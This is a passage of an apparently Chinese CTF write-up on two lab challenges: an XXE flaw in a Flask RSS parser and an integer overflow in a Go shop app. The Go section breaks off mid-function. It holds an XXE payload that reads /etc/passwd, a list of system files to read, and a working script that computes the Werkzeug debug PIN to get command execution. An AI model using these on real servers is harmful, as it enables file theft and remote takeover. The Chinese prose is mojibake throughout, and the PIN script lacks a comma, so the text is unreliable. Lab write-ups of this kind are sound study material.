<h2 id="Week-3-rss-parser"><a href="#Week-3-rss-parser" class="headerlink" title="[Week 3]rss_parser"></a>[Week 3]rss_parser</h2><p>è€ƒç‚¹ï¼šXXEæ¼æ´ã€è®¡ç®—pinç ã€‚<br><img src="https://img-blog.csdnimg.cn/f82184db0289425da13a12befbca8763.png" alt="1"><br>è¿™é‡Œè®©æˆ‘ä»¬è¾“å…¥urlï¼Œçœ‹åˆ°xmlæ–‡ä»¶å¯ä»¥æƒ³åˆ°å¯èƒ½ä¼šå‡ºç°XXEæ¼æ´ï¼Œçœ‹ä¸€ä¸‹æºç ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote
<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree
<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> re

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        feed_url <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r'^(http|https)://'</span><span class="token punctuation">,</span> feed_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>

        content <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>feed_url<span class="token punctuation">)</span><span class="token punctuation">.</span>content
        tree <span class="token operator">=</span> etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>BytesIO<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>resolve_entities<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

        rss_title <span class="token operator">=</span> tree<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'/channel/title'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
        rss_link <span class="token operator">=</span> tree<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'/channel/link'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
        rss_posts <span class="token operator">=</span> tree<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'/channel/item'</span><span class="token punctuation">)</span>

        result<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span> <span class="token operator">=</span> rss_title
        result<span class="token punctuation">[</span><span class="token string">'link'</span><span class="token punctuation">]</span> <span class="token operator">=</span> rss_link
        result<span class="token punctuation">[</span><span class="token string">'posts'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>rss_posts<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">:</span>
            rss_posts <span class="token operator">=</span> rss_posts<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span>

        <span class="token keyword">for</span> post <span class="token keyword">in</span> rss_posts<span class="token punctuation">:</span>
            post_title <span class="token operator">=</span> post<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'./title'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
            post_link <span class="token operator">=</span> post<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'./link'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
            result<span class="token punctuation">[</span><span class="token string">'posts'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'title'</span><span class="token punctuation">:</span> post_title<span class="token punctuation">,</span> <span class="token string">'link'</span><span class="token punctuation">:</span> unquote<span class="token punctuation">(</span>post_link<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
 
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> feed_url<span class="token operator">=</span>feed_url<span class="token punctuation">,</span> result<span class="token operator">=</span>result<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å…¶ä»–åœ°æ–¹æ²¡æœ‰æ‰¾åˆ°å¯ç–‘çš„ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">tree <span class="token operator">=</span> etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>BytesIO<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>resolve_entities<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/0a88ca131ec844ffb15b55cb126ffc1d.png" alt="465"><br><code>etree.parse</code>è§£æxmlæ•°æ®ï¼Œå¯èƒ½ä¼šå‡ºç°æ¼æ´ã€‚<br>åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªxmlæ–‡ä»¶<code>index.xml</code></p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">
&lt;!ENTITY file SYSTEM "file:///etc/passwd"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rss</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>atom</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2005/Atom<span class="token punctuation">"</span></span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>channel</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span><span class="token punctuation">></span></span>https://exp10it.cn/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>link</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>item</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span><span class="token punctuation">></span></span>https://exp10it.cn/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>link</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>item</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>channel</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rss</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç„¶åå¼€å¯ä¸€ä¸ªhttpæœåŠ¡<br>é¶æœºè®¿é—®è¯¥æ–‡ä»¶ï¼Œå‘ç°æˆåŠŸè¯»å–åˆ°<code>/etc/passwd</code>æ–‡ä»¶ã€‚<br><img src="https://img-blog.csdnimg.cn/a4bc997150e64f3ba3b3ab94b5067603.png" alt="1"><br>ç”±äºå¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œè€Œä¸”è¿˜æ˜¯pythonæ­å»ºçš„ç½‘ç«™ï¼Œç›´æ¥è¯»å–æ–‡ä»¶è®¡ç®—pinç ã€‚</p>
<h3 id="è®¡ç®—pinç "><a href="#è®¡ç®—pinç " class="headerlink" title="è®¡ç®—pinç "></a>è®¡ç®—pinç </h3><p>è®¡ç®—pinç æ‰€éœ€æ¡ä»¶</p>
<ul>
<li>username åœ¨å¯ä»¥ä»»æ„æ–‡ä»¶è¯»çš„æ¡ä»¶ä¸‹è¯» &#x2F;etc&#x2F;passwdè¿›è¡ŒçŒœæµ‹</li>
<li>modname é»˜è®¤flask.app</li>
<li>appname é»˜è®¤Flask</li>
<li>moddir flaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„,å¯ä»¥é€šè¿‡æŠ¥é”™æ‹¿åˆ°,å¦‚ä¼ å‚çš„æ—¶å€™ç»™ä¸ªä¸å­˜åœ¨çš„å˜é‡</li>
<li>uuidnode macåœ°å€çš„åè¿›åˆ¶,ä»»æ„æ–‡ä»¶è¯» &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</li>
<li>machine_id æœºå™¨ç   #linuxçš„idä¸€èˆ¬å­˜æ”¾åœ¨&#x2F;etc&#x2F;machine-idæˆ–&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_idï¼Œdockeré¶æœºåˆ™è¯»å–&#x2F;proc&#x2F;self&#x2F;cgroup</li>
</ul>
<p>è¯»å–å®Œå¯¹åº”å€¼åå¡«å…¥ç›¸åº”è„šæœ¬è®¡ç®—pinç </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain

probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'app'</span>  <span class="token comment"># /etc/passwd</span>
    <span class="token string">'flask.app'</span><span class="token punctuation">,</span>  <span class="token comment"># é»˜è®¤å€¼</span>
    <span class="token string">'Flask'</span><span class="token punctuation">,</span>  <span class="token comment"># é»˜è®¤å€¼</span>
    <span class="token string">'/usr/local/lib/python3.9/site-packages/flask/app.py'</span>  <span class="token comment"># æŠ¥é”™å¾—åˆ°</span>
<span class="token punctuation">]</span>

private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'2485378088962'</span><span class="token punctuation">,</span>  <span class="token comment"># /sys/class/net/eth0/address åè¿›åˆ¶</span>
    <span class="token string">'fd3e34a4-6949-4575-83ed-79944fc5e148'</span>
    <span class="token comment"># å­—ç¬¦ä¸²åˆå¹¶ï¼š1./etc/machine-id(dockerä¸ç”¨çœ‹) /proc/sys/kernel/random/boot_idï¼Œæœ‰boot-idé‚£å°±æ‹¼æ¥boot-id 2. /proc/self/cgroup</span>
<span class="token punctuation">]</span>

<span class="token comment"># ä¸‹é¢ä¸ºæºç é‡Œé¢æŠ„çš„ï¼Œä¸éœ€è¦ä¿®æ”¹</span>
h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"cookiesalt"</span><span class="token punctuation">)</span>

cookie_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"__wzd</span><span class="token interpolation"><span class="token punctuation">&#123;</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">20]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>

<span class="token comment"># If we need to generate a pin we salt it a bit more so that we don't</span>
<span class="token comment"># end up with the same value and generate out 9 digits</span>
num <span class="token operator">=</span> <span class="token boolean">None</span>
<span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"pinsalt"</span><span class="token punctuation">)</span>
    num <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">09d</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>

<span class="token comment"># Format the pincode in groups of digits for easier remembering if</span>
<span class="token comment"># we don't have a result yet.</span>
rv <span class="token operator">=</span> <span class="token boolean">None</span>
<span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>
                num<span class="token punctuation">[</span>x <span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
                <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>
            <span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        rv <span class="token operator">=</span> num

<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¾—åˆ°pinç ï¼Œå¡«å…¥åå¼€å§‹å‘½ä»¤æ‰§è¡Œã€‚<br><img src="https://img-blog.csdnimg.cn/925473e1a4c4477982a13855a341e2b0.png" alt="465"></p>
<h2 id="week3-GoShop"><a href="#week3-GoShop" class="headerlink" title="[week3] GoShop"></a>[week3] GoShop</h2><p>è€ƒç‚¹ï¼šæ•´æ•°æº¢å‡º<br>æ—¢ç„¶æ˜¯å¤ç°ï¼Œé‚£å°±ä¸è¦ä¸ºäº†åšé¢˜è€Œåšé¢˜ï¼Œç€é‡å­¦ä¹ è¿™é“é¢˜çš„è€ƒç‚¹ã€‚</p>
<p>è¿™é“é¢˜å°±æ˜¯è®©æˆ‘ä»¬æ¥ä¹°flagï¼Œä»·æ ¼ä¸º999999999ï¼Œæ¶‰åŠåˆ°æ•°å­—å¤§çš„ï¼Œé‚£è€ƒç‚¹åœ¨è¿™é‡Œçš„æ¦‚ç‡å°±å¾ˆå¤§ã€‚<br><img src="https://img-blog.csdnimg.cn/21fa88c2de464768b427ee4010695e0c.png" alt="1"></p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"crypto/rand"</span>
	<span class="token string">"embed"</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"github.com/gin-contrib/sessions"</span>
	<span class="token string">"github.com/gin-contrib/sessions/cookie"</span>
	<span class="token string">"github.com/gin-gonic/gin"</span>
	<span class="token string">"github.com/google/uuid"</span>
	<span class="token string">"html/template"</span>
	<span class="token string">"net/http"</span>
	<span class="token string">"os"</span>
	<span class="token string">"strconv"</span>
<span class="token punctuation">)</span>

<span class="token keyword">type</span> User <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
	Id    <span class="token builtin">string</span>
	Money <span class="token builtin">int64</span>
	Items <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int64</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">type</span> Product <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
	Name  <span class="token builtin">string</span>
	Price <span class="token builtin">int64</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> users <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>User

<span class="token keyword">var</span> products <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>Product

<span class="token comment">//go:embed public</span>
<span class="token keyword">var</span> fs embed<span class="token punctuation">.</span>FS

<span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	users <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>User<span class="token punctuation">)</span>
	products <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>Product<span class="token punctuation">&#123;</span>
		<span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"Apple"</span><span class="token punctuation">,</span> Price<span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"Banana"</span><span class="token punctuation">,</span> Price<span class="token punctuation">:</span> <span class="token number">50</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"Orange"</span><span class="token punctuation">,</span> Price<span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"Flag"</span><span class="token punctuation">,</span> Price<span class="token punctuation">:</span> <span class="token number">999999999</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">IndexHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	c<span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"index.html"</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">InfoHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>

	<span class="token keyword">if</span> s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		u <span class="token operator">:=</span> uuid<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		users<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span>Id<span class="token punctuation">:</span> u<span class="token punctuation">,</span> Money<span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span> Items<span class="token punctuation">:</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int64</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
		s<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> u<span class="token punctuation">)</span>
		s<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>

	user <span class="token operator">:=</span> users<span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
	c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
		<span class="token string">"user"</span><span class="token punctuation">:</span> user<span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">ResetHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
	s<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

	u <span class="token operator">:=</span> uuid<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	users<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span>Id<span class="token punctuation">:</span> u<span class="token punctuation">,</span> Money<span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span> Items<span class="token punctuation">:</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int64</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
	s<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> u<span class="token punctuation">)</span>
	s<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

	c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
		<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Reset success"</span><span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">BuyHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
	user <span class="token operator">:=</span> users<span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

	data <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	c<span class="token punctuation">.</span><span class="token function">ShouldBindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token punctuation">)</span>

	<span class="token keyword">var</span> product <span class="token operator">*</span>Product

	<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> products <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token operator">==</span> v<span class="token punctuation">.</span>Name <span class="token punctuation">&#123;</span>
			product <span class="token operator">=</span> v
			<span class="token keyword">break</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">if</span> product <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"No such product"</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">&#125;</span>

	n<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"num"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

	<span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Product num can't be negative"</span><span class="token punctuation">,</span>
